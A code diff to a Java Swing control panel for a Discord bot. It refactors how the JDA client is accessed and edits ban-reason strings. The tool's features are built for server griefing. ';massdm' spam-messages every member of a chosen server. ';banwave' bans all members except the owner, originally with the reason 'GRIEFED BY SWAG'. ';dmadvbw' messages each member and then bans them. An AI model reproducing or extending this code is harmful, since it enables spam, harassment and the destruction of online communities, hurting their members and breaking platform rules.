@@ -59,11 +59,11 @@ class ConfigGUI
         c.setLayout(null);
 
         List<String> servers = new ArrayList<>();
-        for (Guild g : Core.jda.getGuilds()) {
+        for (Guild g : Core.getInstance().getJDA().getGuilds()) {
             servers.add(g.getName());
         }
 
-        JLabel title = new JLabel("Discord Bot | By swag#0014");
+        JLabel title = new JLabel("Discord Bot | By swag");
         title.setFont(new Font("Tahoma", Font.PLAIN, 30));
         title.setSize(500, 40);
         title.setLocation(300, 30);
@@ -75,7 +75,7 @@ class ConfigGUI
         name.setLocation(100, 100);
         c.add(name);
 
-        JTextField tname = new JTextField(Core.jda.getSelfUser().getName() + "#" + Core.jda.getSelfUser().getDiscriminator() + " (" + Core.jda.getSelfUser().getId() + ")");
+        JTextField tname = new JTextField(Core.getInstance().getJDA().getSelfUser().getName() + "#" + Core.getInstance().getJDA().getSelfUser().getDiscriminator() + " (" + Core.getInstance().getJDA().getSelfUser().getId() + ")");
         tname.setFont(new Font("Tahoma", Font.PLAIN, 15));
         tname.setSize(260, 35);
         tname.setLocation(200, 100);
@@ -226,7 +226,7 @@ class ConfigGUI
             String guildID = "null";
             StringBuilder stringBuffer = new StringBuilder();
             int memberCount = 0;
-            for (Guild g : Core.jda.getGuilds()) {
+            for (Guild g : Core.getInstance().getJDA().getGuilds()) {
                 if (g.getName().equals(Objects.requireNonNull(serverBox.getSelectedItem()).toString())) {
                     for (Member member : g.getMembers()) {
                         memberCount++;
@@ -253,11 +253,11 @@ class ConfigGUI
                 if (tadd.getText().startsWith(";massdm")) {
                     String message = tadd.getText().replaceFirst(";massdm", "");
                     tadd.setText("");
-                    int memberSize = Core.jda.getGuildsByName(Objects.requireNonNull(serverBox.getSelectedItem()).toString(), true).get(0).getMemberCount();
+                    int memberSize = Core.getInstance().getJDA().getGuildsByName(Objects.requireNonNull(serverBox.getSelectedItem()).toString(), true).get(0).getMemberCount();
                     Thread massDM = new Thread(() -> {
                         try {
                             int counter = 0;
-                            for (Member member : Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getMembers()) {
+                            for (Member member : Core.getInstance().getJDA().getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getMembers()) {
                                 if (!member.getUser().isBot()) {
                                     member.getUser().openPrivateChannel().flatMap(privateChannel -> privateChannel.sendMessage(message)).queue(null, failure -> tadd.append(member.getUser().getAsTag() + " has their DMs disabled.\n"));
                                     counter++;
@@ -273,28 +273,28 @@ class ConfigGUI
                     tadd.append(("Messaging " + memberSize + " users!\n"));
 
                 } else if (tadd.getText().startsWith(";banwave")) {
-                    Guild guild = Core.jda.getGuildsByName(Objects.requireNonNull(serverBox.getSelectedItem()).toString(), true).get(0);
+                    Guild guild = Core.getInstance().getJDA().getGuildsByName(Objects.requireNonNull(serverBox.getSelectedItem()).toString(), true).get(0);
                     {
                         tadd.setText("Initiating Ban Wave... (" + guild.getMemberCount() + ")\n");
-                        guild.getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(Core.jda.getSelfUser().getId()) && guild.getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "GRIEFED BY SWAG").queue());
+                        guild.getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(Core.getInstance().getJDA().getSelfUser().getId()) && guild.getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "champagnepapi").queue());
                         tadd.append("Ban Wave Complete!");
                     }
                 } else if (tadd.getText().startsWith(";dmadvbw")) {
                     String message = tadd.getText().replaceFirst(";dmadvbw", "");
                     tadd.setText("");
-                    int memberSize = Core.jda.getGuildsByName(Objects.requireNonNull(serverBox.getSelectedItem()).toString(), true).get(0).getMemberCount();
+                    int memberSize = Core.getInstance().getJDA().getGuildsByName(Objects.requireNonNull(serverBox.getSelectedItem()).toString(), true).get(0).getMemberCount();
                     Thread massDM = new Thread(() -> {
                         try {
                             int counter = 0;
-                            for (Member member : Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getMembers()) {
+                            for (Member member : Core.getInstance().getJDA().getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getMembers()) {
                                 if (!member.getUser().isBot()) {
                                     member.getUser().openPrivateChannel().flatMap(privateChannel -> privateChannel.sendMessage(message)).queue(null, failure -> tadd.append(member.getUser().getAsTag() + " has their DMs disabled.\n"));
                                     counter++;
                                     tadd.append("Messaged " + member.getUser().getAsTag() + " (" + counter + ")\n");
                                     Thread.sleep(dmDelaySlider.getValue());
                                 }
-                                if (Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getSelfMember().canInteract(member)) {
-                                    member.ban(0, "GRIEFED BY SWAG LEL!").queue();
+                                if (Core.getInstance().getJDA().getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getSelfMember().canInteract(member)) {
+                                    member.ban(0, "champagnepapi").queue();
                                     tadd.append("Banned " + member.getUser().getAsTag());
                                 }
                             }
